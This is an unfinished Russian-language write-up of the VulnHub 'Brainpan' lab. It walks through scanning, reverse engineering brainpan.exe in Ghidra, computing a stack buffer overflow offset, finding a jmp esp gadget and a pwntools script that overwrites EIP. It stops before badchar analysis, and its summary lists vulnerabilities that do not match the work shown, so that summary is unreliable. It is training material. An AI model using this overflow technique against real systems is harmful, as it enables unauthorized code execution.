# VulnHub - 41-Brainpan

📅 Дата: 2025-05-22  
🧠 Сложность:  
💻 IP-адрес: 192.168.56.123  

---

## 🔍 Сканирование

```bash
export ip=192.168.56.123
export ports=9999,10000
sudo nmap -sT -Pn -sV -T4 -A -p $ports $ip -oN scans/nmap.txt
```

🖼️ Nmap скан:

![nmap scan](screenshots/nmap_scan.png)

---

## 🕵️ Enumeration
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub]
└─$ ffuf -fc 404 -t 100 -u http://$ip:10000/FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
```
![brainpan scan](screenshots/brainpan.exe.png)

Информация о файле  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections
```

Загружаю в Ghidra
![ghidra 1](screenshots/gh1.png)

Вижу переменные отказа и разрешения доступа:
```bash
  local_404 = "                          ACCESS DENIED\n";
  local_408 = "                          ACCESS GRANTED\n";
```
В переменную **char local_3fc [1016];** считывается пользовательский ввод (1000 байт) -> затирание данных можно не рассматривать

Функция **get_reply(local_3fc)** осуществляет какую-то проверку и возвращает **0**, если она успешна.

Иду в функцию **get_reply()**:
![ghidra 2](screenshots/gh2.png)

Получение доступа с использованием `shitstorm` ничего не дало:  
![ghidra 3](screenshots/gh3.png)

Так что смотрю переполнение буфера: param_1 [1000 байт] записываются в переменную local_20c [520 байт]

Стек функции `get_reply(char * param_1)` имеет такой вид:
<img width="845" height="354" alt="image" src="https://github.com/user-attachments/assets/bd5642c0-e4f8-4ef3-ae14-83657452443f" />
  
т.е. для изменения адреса возврата, в переменную `local_20c` нужно положить 520 байт,   
ещё 4 байта перезапишут `EBP`,  
и ещё 4 байта перезапишут `return adress`  
  
Итого: **520**(local_20c) + **4**(EBP) + **4**(EIP)

Запускаю brainpan.exe в отладчике immunity debugger на 32 битной системе Windows7  
<img width="1917" height="1014" alt="image" src="https://github.com/user-attachments/assets/b0544e88-1308-4de8-a9b3-4437ce3bfa34" />

Смотрю защиту `!mona modules`
<img width="1143" height="367" alt="image" src="https://github.com/user-attachments/assets/ae8d23b8-96b2-4840-899e-7fe52cab7270" />  
 - **ASLR** (Address Space Layout Randomization): Указано "False", что означает, что защита ASLR отключена ==> адреса памяти остаются постоянными.
 - **NXCompat** (No Execute): "False", что указывает на отсутствие защиты от выполнения кода в областях данных (DEP отключена).

Таким образом, если удастся:  
 - найти постоянный адрес инструкции `call esp`, `jmp esp`, или немного более сложные rop chains для вызова кода из стека   
 - получить контроль над регистром EIP, чтобы положить туда адрес инструкции вызова кода из стека  
 - положить в стек свою полезную нагрузку

то можно будет заставить приложение выполнить произвольный код.

Ищу адрес `call esp`, `jmp esp` внутри **brainpan.exe**  
Для этого использую утилиту `ROPgadget`.  
Можно использовать команду, которая выведет только гаджеты, содержащие call, jmp и ссылки на esp:
```bash
ROPgadget --binary ./brainpan.exe --only "call|jmp|esp"
```

Но я предпочитаю выводить все гаджеты и искать вручную регулярными выражениями, меняя уровень вложенности
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ ROPgadget --binary ./brainpan.exe > brainpan.allgadgets.txt
                                                                                                                   
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ grep -iE "call esp" brainpan.allgadgets.txt | awk -F';' 'NF <= 2' 
                                                                                                                   
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ grep -iE "jmp esp" brainpan.allgadgets.txt | awk -F';' 'NF <= 2'
0x311712f3 : jmp esp
0x311712f1 : mov ebp, esp ; jmp esp
```

Есть `0x311712f3 : jmp esp`, далее нужно проверить возможность получения контроля над адресом возврата и возможностью записать полезную нагрузку в стек.

Пробую подключиться с kali  
```bash
┌──(kali㉿0x2d-pentest)-[~]
└─$ sudo nmap -sn 192.168.56.106/24                                                                  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 06:16 EDT
Nmap scan report for 192.168.56.100
Host is up (0.00031s latency).
MAC Address: 08:00:27:81:C6:A7 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.124
Host is up (0.00072s latency).
MAC Address: 08:00:27:99:B1:5F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.106
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.63 seconds
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~]
└─$ nc 192.168.56.124 9999             
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> asdfasdf\
                          ACCESS DENIED
```

Отлично, хост `192.168.56.124` и порт `9999`.  
Чтобы проверить уязвимость переполнения буфера, буду использовать библиотеку `pwntools`.  
Код стартового шаблона я немного переделал под себя, так что он слегка отличается от дефолтного.  
Активирую виртуальное окружение и генерирую шаблон  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ actv
                                                                                                                  
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ pwn template ./brainpan.exe --quiet --host 192.168.56.124 --port 9999 > x.py
[*] Automatically detecting challenge binaries...
```

Далее будет удобнее работать в PyCharm  
```python
from pwn import *

context.update(arch='i386')
exe = './brainpan.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#====================PAYLOAD DEFINITION=====================
junk    = b'A'*520
EBP     = b'B'*4
EIP     = b'C'*4
stack   = b'D'*12

payload = b''.join([
    junk,
    EBP,
    EIP,
    stack,
])
#========================CONNECTION=========================
io = start()
print(io.recv().decode('utf-8'))
io.sendline(payload)
io.interactive()

#========================INFORMATION========================
# RDI, RSI, RDX, RCX, R8, R9, STACK
#       1    2    3    4   5    6
```

Если всё правильно рассчитал, то должен получить  
  - **СССС** в адресе возврата 
  - 3 строки букв **D** в стеке  

Перезапускаю процесс в отладчике и ставлю breakpoint на вызов функции `get_reply()`
<img width="1917" height="1017" alt="image" src="https://github.com/user-attachments/assets/4612c213-b97c-4238-9388-523e827c104b" />

Получаю контроль над адресом возврата  
<img width="1920" height="1022" alt="image" src="https://github.com/user-attachments/assets/90061dc7-7b56-4a39-993c-306a052ba824" />

Далее ищу **badchars**


## 📂 Получение доступа



## ⚙️ Привилегии



## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


